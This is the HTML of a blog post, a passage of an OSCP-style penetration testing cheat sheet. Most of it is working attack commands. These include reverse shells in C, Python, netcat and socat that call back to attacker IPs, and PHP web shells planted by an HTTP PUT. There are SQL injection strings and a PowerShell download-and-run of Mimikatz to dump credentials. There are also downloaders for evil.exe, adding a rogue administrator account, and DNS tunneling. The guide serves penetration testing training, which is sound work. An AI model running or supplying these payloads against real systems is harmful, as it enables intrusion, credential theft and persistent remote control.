  sa.sin_family <span style="color:#39c">=</span> AF_INET;
  sa.sin_addr.s_addr <span style="color:#39c">=</span> inet_addr(REMOTE_ADDR);
  sa.sin_port <span style="color:#39c">=</span> htons(REMOTE_PORT);
  s <span style="color:#39c">=</span> socket(AF_INET, SOCK_STREAM, <span style="color:#cd00cd">0</span>);
  connect(s, (<span style="color:#cdcd00">struct</span> sockaddr <span style="color:#39c">*</span>)<span style="color:#39c">&amp;</span>sa, <span style="color:#cdcd00">sizeof</span>(sa));
  dup2(s, <span style="color:#cd00cd">0</span>);
  dup2(s, <span style="color:#cd00cd">1</span>);
  dup2(s, <span style="color:#cd00cd">2</span>);
  execve(args[<span style="color:#cd00cd">0</span>], <span style="color:#39c">&amp;</span>args[<span style="color:#cd00cd">0</span>], <span style="color:#cd00cd">0</span>);
  <span style="color:#cdcd00">return</span> <span style="color:#cd00cd">0</span>;
}
</code></pre></div><hr>
<h2 id="tty-shell-upgrades">TTY Shell Upgrades</h2>
<hr>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000080"># python</span>
python -c <span style="color:#cd0000">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>

<span style="color:#000080"># bash</span>
<span style="color:#cd00cd">echo</span> os.system<span style="color:#39c">(</span><span style="color:#cd0000">&#39;/bin/bash&#39;</span><span style="color:#39c">)</span>
/bin/sh -i

<span style="color:#000080"># ash</span>
/bin/busybox sh -i

<span style="color:#000080"># perl</span>
perl -e <span style="color:#cd0000">&#39;exec &#34;/bin/sh&#34;;&#39;</span>

<span style="color:#000080"># lua interpreter</span>
lua: os.execute<span style="color:#39c">(</span><span style="color:#cd0000">&#39;/bin/ash&#39;</span><span style="color:#39c">)</span>
lua -e <span style="color:#cd0000">&#34;os.execute(&#39;/bin/sh&#39;)&#34;</span>

<span style="color:#000080"># nmap interactive</span>
!sh

<span style="color:#000080"># vi</span>
:!bash
or
:set <span style="color:#00cdcd">shell</span><span style="color:#39c">=</span>/bin/bash:shell
</code></pre></div><h3 id="socat">Socat</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">On Kali, <span style="color:#39c">(</span>Listen<span style="color:#39c">)</span>:
<span style="color:#000080"># https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method2usingsocat</span>
socat file:<span style="color:#cd0000">`</span>tty<span style="color:#cd0000">`</span>,raw,echo<span style="color:#39c">=</span><span style="color:#cd00cd">0</span> tcp-listen:4444

- <span style="color:#cdcd00">then</span> -

On Victim:
<span style="color:#000080"># WHERE my-local-ip is 192.168.1.2</span>
wget -O /tmp/socat http://my-local-ip/socat/builds/i686/socat
chmod +x /tmp/socat
/tmp/socat exec:<span style="color:#cd0000">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.2:4444

wget http://192.168.0.101/socat/socat.tar
tar -xvf socat.tar
./socat-shell.sh
chmod +x socat
./socat exec:<span style="color:#cd0000">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.2:4444

<span style="color:#000080"># By itself:</span>
./socat exec:<span style="color:#cd0000">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.2:4444
</code></pre></div><hr>
<h2 id="nmap">Nmap</h2>
<hr>
<h3 id="important-flags">Important Flags</h3>
<pre><code>-A: Not only Service Version but OS detection, Auto script scanning and traceroute.
-oN: Output to nmap file.
-oG: Output to greppable format
-oA: Output to all formats
-oX: Output to XML.
-p-: Scan all ports including port 0.
-T: Timing (0-5) How fast nmap scans.
-sU: UDP Scan
-sT: TCP Connect Scan -
-sV: Check open ports for service/version info. Ex: Web on non-std port.
-sS: TCP SYN Scan -
-Pn: Doesn't ping, assumes the machine is up. Great for Windows.
-sn: No port scan, just ping to see if host is up.
</code></pre><h3 id="all-port-scans">All Port Scans</h3>
<pre><code>nmap -p- 192.168.1.1 -oN outfile
</code></pre><h3 id="full-scan">Full Scan</h3>
<pre><code>nmap -vv -Pn -A -sS -p- 192.168.1.1 -oN outfile
</code></pre><h3 id="udp-scan">UDP Scan</h3>
<pre><code>nmap --top-ports 1000 -sU -vv 192.168.1.1 -oN outfile-udp
</code></pre><h3 id="script-scan">Script Scan</h3>
<pre><code>ls /usr/share/nmap/scripts
nmap -A -p- --script

nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.1-254 &gt;&gt; smb_vulnerabilities.log

nmap --script vuln -p 139,445 192.168.22.25
</code></pre><hr>
<h2 id="web-stuff">Web Stuff</h2>
<hr>
<h3 id="gobuster">Gobuster</h3>
<pre><code>gobuster -u http://192.168.1.X/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e

gobuster -u http://192.168.1.X/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s '200,204,403,500' -e
</code></pre><h3 id="extra-web-stuff">Extra Web Stuff</h3>
<pre><code>'%0a' can encode to carriage returns
</code></pre><h3 id="phpmyadmin-queries">PHPMyAdmin Queries</h3>
<pre><code>SELECT LOAD_FILE ('/etc/passwd');
</code></pre><h3 id="sql-injections">SQL Injections</h3>
<pre><code>1' or '1' = '1
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' {
' OR '1'='1' /*
' or 1=1--
&quot; or 1=1--
or 1=1--
' or 'a'='a
&quot; or &quot;a&quot;=&quot;a
') or ('a'='a
&quot;) or (&quot;a&quot;=&quot;a
</code></pre><h3 id="sqlmap">SQLMap</h3>
<pre><code>sqlmap -u http://192.168.22.66/comment.php?id=738 --dbms=mysql --dump --threads=5

#Shell on a machine:
sqlmap -u http://192.168.22.66/comment.php?id=738 --dbms=mysql --threads=5 --os-shell
</code></pre><h3 id="wpscan">WPScan</h3>
<pre><code>wpscan --url &lt;IP&gt;
wpscan --url 192.168.22.66 --wordlist /usr/share/wordlists/rockyou.txt --username admin
</code></pre><h3 id="curl-look-for-putpost">Curl (Look for PUT/POST)</h3>
<pre><code>curl -v -X OPTIONS 192.168.22.66/test
</code></pre><h3 id="put-a-php-shell">PUT a PHP Shell</h3>
<pre><code>curl -v -X PUT -d '&lt;pre&gt;&lt;?php system ($_GET[&quot;cmd&quot;]); ?&gt;&lt;/pre&gt;' http://192.168.22.66/test/shell.php
</code></pre><h3 id="simple-php-web-shell">Simple PHP Web Shell</h3>
<pre><code>&lt;?php system($_REQUEST['cmd']); ?&gt;

&lt;?php system ($_GET[&quot;cmd&quot;]); ?&gt;
</code></pre><h3 id="get-a-limited-shell-from-php-webshell">Get a Limited Shell From PHP Webshell:</h3>
<pre><code># on kali
nv -nvlp 443

# on victim via browser
http://192.168.22.66/shell.php?cmd=nc 192.168.1.100 -e /bin/bash

# -or-
http://192.168.22.66/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.100&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'

# -or-
http://192.168.22.66/shell.php?cmd=mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.100 443 1&gt;/tmp/backpipe
</code></pre><hr>
<h2 id="db-stuff">DB Stuff</h2>
<hr>
<pre><code>mysql -u root -pDaNkMeMes -e &quot;show databases;&quot;
mysql -u root -pDaNkMeMes &lt;database&gt; -e &quot;show tables;&quot;
mysql -u root -pDaNkMeMes mysql -e &quot;select * from user\G;&quot;
</code></pre><hr>
<h2 id="post-exploitation">Post Exploitation</h2>
<hr>
<hr>
<h2 id="mimikatz-not-through-metasploit">Mimikatz (Not Through Metasploit)</h2>
<hr>
<pre><code>wmic process call create &quot;powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\Users\\public\\a.txt&quot;

cd /opt/PowerShellMafia/PowerSploit/master/Exfiltration/
python -m SimpleHTTPServer 80
wmic process call create &quot;powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://my-local-ip/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\Users\\Public\\a.txt&quot;
</code></pre><hr>
<h2 id="windows-file-transfers">Windows File Transfers</h2>
<hr>
<h3 id="wget-through-cscript-to-upload-ncevilexe">WGET Through CScript (to upload nc/evil.exe)</h3>
<pre><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs
echo Err.Clear &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
echo http.Open &quot;GET&quot;, strURL, False &gt;&gt; wget.vbs
echo http.Send &gt;&gt; wget.vbs
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
echo Set http = Nothing &gt;&gt; wget.vbs
echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs
echo strData = &quot;&quot; &gt;&gt; wget.vbs
echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs
echo Next &gt;&gt; wget.vbs
echo ts.Close &gt;&gt; wget.vbs
then do...
cscript wget.vbs http://192.168.22.66/evil.exe evil.exe
</code></pre><h3 id="wget-through-powershell-to-upload-ncevilexe">WGET Through PowerShell (to upload nc/evil.exe)</h3>
<pre><code>echo $storageDir = $pwd &gt; wget.ps1
echo $webclient = New-Object System.Net.WebClient &gt;&gt; wget.ps1
echo $url = &quot;http://192.168.22.66/psexec.exe&quot; &gt;&gt; wget.ps1
echo $file = &quot;psexec.exe&quot; &gt;&gt; wget.ps1
echo $webclient.DownloadFile($url,$file) &gt;&gt; wget.ps1
then do...
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
</code></pre><h3 id="tftp-windows">TFTP (Windows)</h3>
<pre><code>root@kali:~/oscp/file_xfer/tftp mkdir /tftp
root@kali:~/oscp/file_xfer/tftp atftpd --daemon --port 69 /tftp
root@kali:~/oscp/file_xfer/tftp cp /usr/share/windows-binaries/nc.exe /tftp

tftp -i 192.168.22.66 get nc.exe
</code></pre><h3 id="ftp-transfer">FTP (Transfer)</h3>
<pre><code>root@kali:~ apt-get update &amp;&amp; apt-get install pure-ftpd

#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart

# then
C:\Users\offsec&gt; echo open 192.168.22.66 21&gt; ftp.txt
C:\Users\offsec&gt; echo USER offsec &gt;&gt; ftp.txt
C:\Users\offsec&gt; echo ftp &gt;&gt; ftp.txt
C:\Users\offsec&gt; echo bin &gt;&gt; ftp.txt
C:\Users\offsec&gt; echo GET nc.exe &gt;&gt; ftp.txt
C:\Users\offsec&gt; echo bye &gt;&gt; ftp.txt
C:\Users\offsec&gt; ftp -v -n -s:ftp.txt
</code></pre><h3 id="smb">SMB</h3>
<pre><code>python /usr/share/doc/python-impacket/examples/smbserver.py DankShareName /var/www/html

# confirm share is up from linux
smbclient -L 192.168.1.128 --no-pass

# confirm share is up from windows
net view \\192.168.1.128

# then party like its hot. Just simply use it like it’s a folder in windows:
dir \\192.168.1.128\wlan1
copy \\192.168.1.128\wlan1\wpc.exe .
wpc.exe -a --dump
</code></pre><hr>
<h2 id="windows-stuff">Windows Stuff</h2>
<hr>
<h3 id="check-privs">Check Privs</h3>
<pre><code>cacls cmd.exe
</code></pre><h3 id="resetadd-account">Reset/Add Account</h3>
<pre><code># Add user
net user supreme lol123! /add
net localgroup administrators supreme /add
</code></pre><hr>
<h2 id="dns-stuff">DNS Stuff</h2>
<hr>
<h3 id="dns-zone-transfer">DNS Zone Transfer</h3>
<pre><code># With host (first find the NS)
host -t ns domain.local | cut -d &quot; &quot; -f 4

# WThen check for zone transfers against NS.
host -t axfr domain.local 192.168.21.2
host -l domain.local 192.168.21.2

# With dig (first find the NS).
dig +short ns domain.com
&gt; ns1.domain.com
&gt; ns2.domain.com

# then check for zone transfers against NS
dig axfr domain.com @ns1.domain.com
</code></pre><h3 id="dns-tunneling">DNS Tunneling</h3>
<pre><code># On AWS/Azure/GCloud/DigiOcean
# First register a domain name and transfer it over to the hosting platform.
# Then create 2 records
t1        IN    NS    dnsserver1.server.com.    ; note the dot!
dnsserver1    IN    A    200.200.200.200

# Setup the daemon (SERVER SIDE)
root@bianca:/# apt-get install iodine
iodined -f -c -P password123 200.200.200.200 t1.server.com

# Setup the daemon (CLIENT SIDE)
root@kali:/# apt-get install iodine
iodine -f -P password123 t1.server.com

# Setting up the proxy
ssh -N -D 8080 root@10.0.0.1

# Add proxychains config
root@kali:/# vim /etc/proxychains.conf
# at the bottom add
socks5 127.0.0.1 8080

# --------------------
# If you need to test the iodine connection
# iodined will respond to NS requests sent for the subdomains of the tunnel domain.
dig -t NS dnsserver2.t1.server.com

# or send any requests starting with a 'z'
dig -t TXT z456.dnsserver1.server.com
dig -t SRV z456.dnsserver1.server.com
dig -t CNAME z456.dnsserver1.server.com

# https://github.com/yarrick/iodine
</code></pre><h3 id="dnsenum">DNSEnum</h3>
<pre><code>dnsenum domainname.com
</code></pre><h3 id="dnsrecon">DNSrecon</h3>
<pre><code>dnsrecon -d domainname.com -t axfr
</code></pre><hr>
<h2 id="pivoting">Pivoting</h2>
<hr>
<h3 id="rdp-over-ssh-tunnel-static-forwarding">RDP over SSH Tunnel (Static Forwarding):</h3>
<pre><code>ssh -L 127.0.0.1:8080:10.10.12.22:3389 admin@192.168.1.21
rdesktop localhost:8080
</code></pre><h3 id="ssh-tunnel-dynamic-forwarding">SSH Tunnel (Dynamic Forwarding):</h3>
<pre><code>ssh -D 127.0.0.1:8080 admin@192.168.1.21
</code></pre><h2 id="tcpdump">Tcpdump</h2>
<h3 id="listen-to-icmp-requests">Listen to ICMP Requests</h3>
<pre><code>tcpdump -i tap0 icmp and icmp[icmptype]=icmp-echo
</code></pre><hr>
<h2 id="misc">Misc</h2>
<hr>
<h3 id="buffalo-nas">Buffalo NAS</h3>
<pre><code># Check for unauthenticated rsync backup.
&gt; rsync -av 192.168.1.2::
diskArray1
&gt; rsync -av 192.168.1.2::diskArray1 .
important-document.pdf
presentation.pptx
</code></pre><h3 id="compiling-code">Compiling code</h3>
<pre><code>gcc file.c -o out
</code></pre><h3 id="compile-windows-code-in-linux">Compile Windows Code in Linux</h3>
<pre><code>i686-w64-mingw32-gcc MS11-046.c -lws2_32 -o hack.exe
</code></pre>
              
            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">TAGGED IN</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/offensive-security/">Offensive Security</a>

  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/oscp/">OSCP</a>

  <a class="tag tag--primary tag--small" href="https://succurity.com/tags/pentesting/">Pentesting</a>

                  </div>
                
              
            
            <div class="post-actions-wrap">
  
      <nav >
        <ul class="post-actions post-action-nav">
          
            <li class="post-action">
              
                <a class="post-action-btn btn btn--disabled">
              
                  <i class="fa fa-angle-left"></i>
                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
                </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/2020/02/intro-to-buffer-overflows/" data-tooltip="Intro to Buffer Overflows">
              
                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                  <i class="fa fa-angle-right"></i>
                </a>
            </li>
          
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/2020/02/pentesting-field-guide/">
              <i class="fa fa-facebook-official"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/2020/02/pentesting-field-guide/">
              <i class="fa fa-twitter"></i>
            </a>
          </li>
        
      
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#table-of-contents">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  
</div>

            
              
            
          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
    &copy; 2020 Sage. All Rights Reserved
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
        <div class="post-actions-wrap">
  
      <nav >
        <ul class="post-actions post-action-nav">
          
            <li class="post-action">
              
                <a class="post-action-btn btn btn--disabled">
              
                  <i class="fa fa-angle-left"></i>
                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
                </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://succurity.com/2020/02/intro-to-buffer-overflows/" data-tooltip="Intro to Buffer Overflows">
              
                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                  <i class="fa fa-angle-right"></i>
                </a>
            </li>
          
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://succurity.com/2020/02/pentesting-field-guide/">
              <i class="fa fa-facebook-official"></i>
            </a>
          </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://succurity.com/2020/02/pentesting-field-guide/">
              <i class="fa fa-twitter"></i>
            </a>
          </li>
        
      
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#table-of-contents">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  
</div>

      </div>
      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
  <i id="btn-close-shareoptions" class="fa fa-close"></i>
  <ul class="share-options">
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsuccurity.com%2F2020%2F02%2Fpentesting-field-guide%2F">
          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
        </a>
      </li>
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fsuccurity.com%2F2020%2F02%2Fpentesting-field-guide%2F">
          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
        </a>
      </li>
    
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>
    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-remove"></i>
    </div>
    
      <img id="about-card-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
    
    <h4 id="about-card-name">Sage</h4>
    
      <div id="about-card-bio">Succurity through Obscurity usually isn&rsquo;t a good idea.</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        Offensive Security
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker"></i>
        <br/>
        California, US
      </div>
    
  </div>
</div>

    

    
  
    
      
      <div id="cover" style="background-image:url('https://succurity.com/images/cover.jpg');"></div>
    
  


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>


<script src="https://succurity.com/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>


<script lang="javascript">
window.onload = updateMinWidth;
window.onresize = updateMinWidth;
document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
function updateMinWidth() {
  var sidebar = document.getElementById("sidebar");
  var main = document.getElementById("main");
  main.style.minWidth = "";
  var w1 = getComputedStyle(main).getPropertyValue("min-width");
  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
}
</script>


  
    
  




    
  </body>
</html>

